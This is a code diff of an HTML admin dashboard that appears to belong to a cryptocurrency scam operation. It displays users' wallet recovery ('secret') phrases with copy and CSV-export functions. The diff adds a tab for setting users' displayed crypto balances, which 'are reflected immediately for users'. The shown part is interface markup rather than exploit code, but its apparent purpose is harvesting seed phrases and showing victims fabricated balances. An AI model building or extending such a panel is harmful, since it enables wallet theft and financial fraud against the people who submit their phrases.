                             <i data-lucide="shield-check" class="w-8 h-8 text-blue-600 mr-3"></i>
                             <div>
                                 <h1 class="text-xl font-bold text-gray-900">Admin Dashboard</h1>
-                                <p class="text-xs text-gray-500">Wallet Submissions Manager</p>
+                                <p class="text-xs text-gray-500">Wallet Submissions & Balance Manager</p>
                             </div>
+                        </div>
+                        
+                        <!-- Admin Tabs -->
+                        <div class="flex space-x-4 ml-8">
+                            <button onclick="switchTab('submissions')" id="submissionsTab" class="admin-tab px-3 py-2 text-sm font-medium text-blue-600 border-b-2 border-blue-600">
+                                Wallet Submissions
+                            </button>
+                            <button onclick="switchTab('balances')" id="balancesTab" class="admin-tab px-3 py-2 text-sm font-medium text-gray-500 hover:text-gray-700">
+                                User Balances
+                            </button>
                         </div>
                     </div>
                     <div class="flex items-center space-x-4">
@@ -601,138 +1086,256 @@
             </div>
         </nav>
 
-        <!-- Stats Overview -->
-        <div class="px-4 sm:px-6 lg:px-8 py-6">
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
-                <div class="bg-gradient-to-r from-blue-500 to-blue-600 rounded-xl p-5 text-white shadow-lg">
-                    <div class="flex items-center justify-between">
-                        <div>
-                            <p class="text-sm opacity-90">Total Submissions</p>
-                            <p class="text-2xl font-bold mt-1" id="totalCount">0</p>
+        <!-- Submissions Section -->
+        <div id="submissionsSection">
+            <div class="px-4 sm:px-6 lg:px-8 py-6">
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 rounded-xl p-5 text-white shadow-lg">
+                        <div class="flex items-center justify-between">
+                            <div>
+                                <p class="text-sm opacity-90">Total Submissions</p>
+                                <p class="text-2xl font-bold mt-1" id="totalCount">0</p>
+                            </div>
+                            <i data-lucide="database" class="w-8 h-8 opacity-80"></i>
                         </div>
-                        <i data-lucide="database" class="w-8 h-8 opacity-80"></i>
                     </div>
-                </div>
-                
-                <div class="bg-white rounded-xl p-5 shadow hover-lift">
-                    <div class="flex items-center justify-between">
-                        <div>
-                            <p class="text-sm text-gray-600">Mobile Devices</p>
-                            <p class="text-2xl font-bold text-gray-900 mt-1" id="mobileCount">0</p>
+                    
+                    <div class="bg-white rounded-xl p-5 shadow hover-lift">
+                        <div class="flex items-center justify-between">
+                            <div>
+                                <p class="text-sm text-gray-600">Mobile Devices</p>
+                                <p class="text-2xl font-bold text-gray-900 mt-1" id="mobileCount">0</p>
+                            </div>
+                            <i data-lucide="smartphone" class="w-8 h-8 text-green-500"></i>
                         </div>
-                        <i data-lucide="smartphone" class="w-8 h-8 text-green-500"></i>
                     </div>
-                </div>
-                
-                <div class="bg-white rounded-xl p-5 shadow hover-lift">
-                    <div class="flex items-center justify-between">
-                        <div>
-                            <p class="text-sm text-gray-600">Desktop Devices</p>
-                            <p class="text-2xl font-bold text-gray-900 mt-1" id="desktopCount">0</p>
+                    
+                    <div class="bg-white rounded-xl p-5 shadow hover-lift">
+                        <div class="flex items-center justify-between">
+                            <div>
+                                <p class="text-sm text-gray-600">Desktop Devices</p>
+                                <p class="text-2xl font-bold text-gray-900 mt-1" id="desktopCount">0</p>
+                            </div>
+                            <i data-lucide="monitor" class="w-8 h-8 text-blue-500"></i>
                         </div>
-                        <i data-lucide="monitor" class="w-8 h-8 text-blue-500"></i>
                     </div>
                 </div>
             </div>
-        </div>
 
-        <!-- Main Content Area -->
-        <main class="px-4 sm:px-6 lg:px-8 pb-12">
-            <!-- Search and Actions Bar -->
-            <div class="bg-white rounded-xl card-shadow p-5 mb-6 hover-lift">
-                <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between">
-                    <div>
-                        <h2 class="text-lg font-semibold text-gray-900">Wallet Submissions</h2>
-                        <p class="text-sm text-gray-600 mt-1">
-                            <span class="font-medium" id="displayCount">0</span> submissions displayed
-                            • Click any phrase to copy
-                        </p>
-                    </div>
-                    <div class="mt-4 sm:mt-0 flex flex-col sm:flex-row space-y-3 sm:space-y-0 sm:space-x-3">
-                        <div class="relative flex-1">
-                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                                <i data-lucide="search" class="w-4 h-4 text-gray-400"></i>
+            <main class="px-4 sm:px-6 lg:px-8 pb-12">
+                <div class="bg-white rounded-xl card-shadow p-5 mb-6 hover-lift">
+                    <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between">
+                        <div>
+                            <h2 class="text-lg font-semibold text-gray-900">Wallet Submissions</h2>
+                            <p class="text-sm text-gray-600 mt-1">
+                                <span class="font-medium" id="displayCount">0</span> submissions displayed
+                            </p>
+                        </div>
+                        <div class="mt-4 sm:mt-0 flex flex-col sm:flex-row space-y-3 sm:space-y-0 sm:space-x-3">
+                            <div class="relative flex-1">
+                                <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                                    <i data-lucide="search" class="w-4 h-4 text-gray-400"></i>
+                                </div>
+                                <input type="text" id="searchInput" 
+                                       placeholder="Search submissions..." 
+                                       class="pl-10 pr-10 py-2.5 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 w-full">
+                                <button id="clearSearch" class="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400 hover:text-gray-600">
+                                    <i data-lucide="x" class="w-4 h-4"></i>
+                                </button>
                             </div>
-                            <input type="text" id="searchInput" 
-                                   placeholder="Search by name, wallet type, phrase..." 
-                                   class="pl-10 pr-10 py-2.5 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 w-full">
-                            <button id="clearSearch" class="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400 hover:text-gray-600">
-                                <i data-lucide="x" class="w-4 h-4"></i>
+                            <button id="exportBtn" 
+                                    class="inline-flex items-center justify-center px-4 py-2.5 border border-gray-300 rounded-lg text-sm font-medium text-gray-700 bg-white hover:bg-gray-50">
+                                <i data-lucide="download" class="w-4 h-4 mr-2"></i>
+                                Export CSV
                             </button>
                         </div>
-                        <button id="exportBtn" 
-                                class="inline-flex items-center justify-center px-4 py-2.5 border border-gray-300 rounded-lg text-sm font-medium text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
-                            <i data-lucide="download" class="w-4 h-4 mr-2"></i>
-                            Export CSV
-                        </button>
+                    </div>
+                </div>
+
+                <div class="bg-white rounded-xl card-shadow overflow-hidden">
+                    <div id="tableContainer" class="hidden overflow-x-auto">
+                        <table class="min-w-full divide-y divide-gray-200">
+                            <thead class="bg-gray-50">
+                                <tr>
+                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">#</th>
+                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">User & Time</th>
+                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Wallet Type</th>
+                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Secret Phrase</th>
+                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Device</th>
+                                    <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody id="submissionsTable" class="bg-white divide-y divide-gray-200"></tbody>
+                        </table>
+                    </div>
+
+                    <div id="loadingState" class="py-16 text-center">
+                        <div class="inline-block">
+                            <div class="w-12 h-12 border-3 border-blue-500 border-t-transparent rounded-full animate-spin mb-4"></div>
+                            <p class="text-gray-600 font-medium">Loading submissions...</p>
+                        </div>
+                    </div>
+
+                    <div id="emptyState" class="hidden py-16 text-center">
+                        <i data-lucide="inbox" class="w-16 h-16 text-gray-300 mx-auto mb-4"></i>
+                        <h3 class="text-lg font-medium text-gray-900 mb-2">No submissions found</h3>
+                    </div>
+                </div>
+            </main>
+        </div>
+
+        <!-- User Balances Section -->
+        <div id="balancesSection" class="hidden px-4 sm:px-6 lg:px-8 py-8">
+            <!-- User Stats Overview -->
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-5 mb-8">
+                <!-- Total Users Card -->
+                <div class="stat-card bg-gradient-to-br from-blue-500 via-blue-600 to-indigo-700 rounded-2xl p-6 text-white shadow-xl hover-lift overflow-hidden relative">
+                    <div class="absolute -right-8 -top-8 w-32 h-32 bg-white opacity-10 rounded-full"></div>
+                    <div class="relative z-10">
+                        <div class="flex items-center justify-between mb-3">
+                            <p class="text-sm font-semibold opacity-90">Total Users</p>
+                            <div class="bg-white/20 p-2 rounded-xl backdrop-blur">
+                                <i data-lucide="users" class="w-5 h-5"></i>
+                            </div>
+                        </div>
+                        <p class="text-4xl font-bold" id="totalUsers">0</p>
+                        <p class="text-xs opacity-80 mt-2">registered accounts</p>
+                    </div>
+                </div>
+                
+                <!-- Active Today Card -->
+                <div class="stat-card bg-gradient-to-br from-green-400 via-emerald-500 to-teal-600 rounded-2xl p-6 text-white shadow-xl hover-lift overflow-hidden relative">
+                    <div class="absolute -right-8 -top-8 w-32 h-32 bg-white opacity-10 rounded-full"></div>
+                    <div class="relative z-10">
+                        <div class="flex items-center justify-between mb-3">
+                            <p class="text-sm font-semibold opacity-90">Active Today</p>
+                            <div class="bg-white/20 p-2 rounded-xl backdrop-blur animate-pulse">
+                                <i data-lucide="activity" class="w-5 h-5"></i>
+                            </div>
+                        </div>
+                        <p class="text-4xl font-bold" id="activeToday">0</p>
+                        <p class="text-xs opacity-80 mt-2">users online</p>
+                    </div>
+                </div>
+                
+                <!-- Total Balance Card -->
+                <div class="stat-card bg-gradient-to-br from-amber-400 via-orange-500 to-red-600 rounded-2xl p-6 text-white shadow-xl hover-lift overflow-hidden relative">
+                    <div class="absolute -right-8 -top-8 w-32 h-32 bg-white opacity-10 rounded-full"></div>
+                    <div class="relative z-10">
+                        <div class="flex items-center justify-between mb-3">
+                            <p class="text-sm font-semibold opacity-90">Total Balance</p>
+                            <div class="bg-white/20 p-2 rounded-xl backdrop-blur">
+                                <i data-lucide="wallet" class="w-5 h-5"></i>
+                            </div>
+                        </div>
+                        <p class="text-3xl font-bold" id="totalBalance">$0</p>
+                        <p class="text-xs opacity-80 mt-2">USD value</p>
+                    </div>
+                </div>
+                
+                <!-- New This Week Card -->
+                <div class="stat-card bg-gradient-to-br from-purple-500 via-purple-600 to-pink-600 rounded-2xl p-6 text-white shadow-xl hover-lift overflow-hidden relative">
+                    <div class="absolute -right-8 -top-8 w-32 h-32 bg-white opacity-10 rounded-full"></div>
+                    <div class="relative z-10">
+                        <div class="flex items-center justify-between mb-3">
+                            <p class="text-sm font-semibold opacity-90">New This Week</p>
+                            <div class="bg-white/20 p-2 rounded-xl backdrop-blur">
+                                <i data-lucide="user-plus" class="w-5 h-5"></i>
+                            </div>
+                        </div>
+                        <p class="text-4xl font-bold" id="newThisWeek">0</p>
+                        <p class="text-xs opacity-80 mt-2">signups</p>
                     </div>
                 </div>
             </div>
 
-            <!-- Data Table -->
-            <div class="bg-white rounded-xl card-shadow overflow-hidden">
-                <div id="tableContainer" class="hidden overflow-x-auto">
-                    <table class="min-w-full divide-y divide-gray-200">
-                        <thead class="bg-gray-50">
+            <!-- Search and Filter Bar -->
+            <div class="bg-white rounded-2xl card-shadow p-6 mb-8 hover-lift border border-gray-100">
+                <div class="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-6">
+                    <div>
+                        <h2 class="text-2xl font-bold text-gray-900 flex items-center space-x-2">
+                            <i data-lucide="trending-up" class="w-6 h-6 text-blue-600"></i>
+                            <span>Balance Management Hub</span>
+                        </h2>
+                        <p class="text-sm text-gray-600 mt-2 flex items-center space-x-2">
+                            <i data-lucide="info" class="w-4 h-4"></i>
+                            <span>Manage and monitor user crypto portfolios in real-time</span>
+                        </p>
+                    </div>
+                    <div class="flex flex-col sm:flex-row gap-3">
+                        <div class="relative flex-1 sm:flex-none">
+                            <i data-lucide="search" class="absolute left-4 top-3.5 w-5 h-5 text-gray-400 pointer-events-none"></i>
+                            <input type="text" id="userSearchInput" 
+                                   placeholder="Search by email or name..." 
+                                   class="pl-12 pr-4 py-2.5 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-300 focus:border-blue-500 transition-all duration-200 w-full sm:w-72 text-sm font-medium">
+                        </div>
+                        <select id="filterStatus" class="px-4 py-2.5 border-2 border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-300 focus:border-blue-500 transition-all duration-200 font-medium text-sm bg-white">
+                            <option value="all">📊 All Users</option>
+                            <option value="active">✅ Active Only</option>
+                            <option value="inactive">⏸️ Inactive</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Users Balances Table -->
+            <div class="bg-white rounded-2xl card-shadow overflow-hidden border border-gray-100">
+                <div class="overflow-x-auto">
+                    <table class="min-w-full">
+                        <thead class="bg-gradient-to-r from-gray-50 via-gray-100 to-gray-50 border-b-2 border-gray-200">
                             <tr>
-                                <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">#</th>
-                                <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">User & Time</th>
-                                <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Wallet Type</th>
-                                <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
-                                    Secret Phrase <span class="text-xs text-gray-400 font-normal">(Click to copy)</span>
-                                </th>
-                                <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Device</th>
-                                <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Actions</th>
+                                <th class="px-4 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider">#</th>
+                                <th class="px-4 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider">👤 User</th>
+                                <th class="px-4 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider">📅 Joined</th>
+                                <th class="px-4 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider">🔔 Status</th>
+                                <th class="px-4 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider">💰 Balances</th>
+                                <th class="px-4 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider">💵 Total Value</th>
+                                <th class="px-4 py-4 text-left text-xs font-bold text-gray-700 uppercase tracking-wider">⚙️ Actions</th>
                             </tr>
                         </thead>
-                        <tbody id="submissionsTable" class="bg-white divide-y divide-gray-200 submission-row">
-                            <!-- Data rows inserted by JavaScript -->
-                        </tbody>
+                        <tbody id="usersBalancesBody" class="bg-white divide-y divide-gray-100"></tbody>
                     </table>
                 </div>
 
                 <!-- Loading State -->
-                <div id="loadingState" class="py-16 text-center">
+                <div id="balancesLoading" class="py-16 text-center">
                     <div class="inline-block">
                         <div class="w-12 h-12 border-3 border-blue-500 border-t-transparent rounded-full animate-spin mb-4"></div>
-                        <p class="text-gray-600 font-medium">Loading wallet submissions...</p>
-                        <p class="text-sm text-gray-500 mt-2">Fetching data from secure database</p>
+                        <p class="text-gray-600 font-medium">Loading users...</p>
                     </div>
                 </div>
 
                 <!-- Empty State -->
-                <div id="emptyState" class="hidden py-16 text-center">
-                    <i data-lucide="inbox" class="w-16 h-16 text-gray-300 mx-auto mb-4"></i>
-                    <h3 class="text-lg font-medium text-gray-900 mb-2">No submissions found</h3>
-                    <p class="text-gray-600 max-w-md mx-auto">
-                        No wallet submissions match your search criteria.
-                        <span class="block text-sm text-gray-500 mt-1">Try adjusting your search terms or check back later.</span>
-                    </p>
+                <div id="balancesEmpty" class="hidden py-16 text-center">
+                    <i data-lucide="users" class="w-16 h-16 text-gray-300 mx-auto mb-4"></i>
+                    <h3 class="text-lg font-medium text-gray-900 mb-2">No users found</h3>
+                    <p class="text-gray-600">Users will appear here after they sign up.</p>
                 </div>
             </div>
+        </div>
 
-            <!-- Security Notice -->
+        <!-- Security Notice -->
+        <div class="px-4 sm:px-6 lg:px-8 pb-12">
             <div class="mt-8 bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-xl p-5">
                 <div class="flex items-start">
                     <i data-lucide="shield-alert" class="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5"></i>
                     <div class="ml-4">
                         <h3 class="text-sm font-semibold text-blue-900">Security Notice</h3>
                         <div class="mt-2 text-sm text-blue-800">
-                            <p class="mb-2">You are accessing sensitive recovery phrase data. Please adhere to security best practices:</p>
+                            <p class="mb-2">You are accessing sensitive data. Please adhere to security best practices:</p>
                             <ul class="list-disc list-inside space-y-1">
-                                <li>Recovery phrases are copied to clipboard on click for convenience</li>
+                                <li>Recovery phrases and balances are sensitive data</li>
                                 <li>Never share clipboard contents containing sensitive data</li>
-                                <li>Always clear clipboard after use (Ctrl+Shift+V for plain text)</li>
+                                <li>Always clear clipboard after use</li>
                                 <li>Access only from secure, trusted networks</li>
                                 <li>Log out when leaving your workstation unattended</li>
+                                <li>Balance changes are reflected immediately for users</li>
                             </ul>
                         </div>
                     </div>
                 </div>
             </div>
-        </main>
+        </div>
     </div>
 </body>
 </html>
-
-
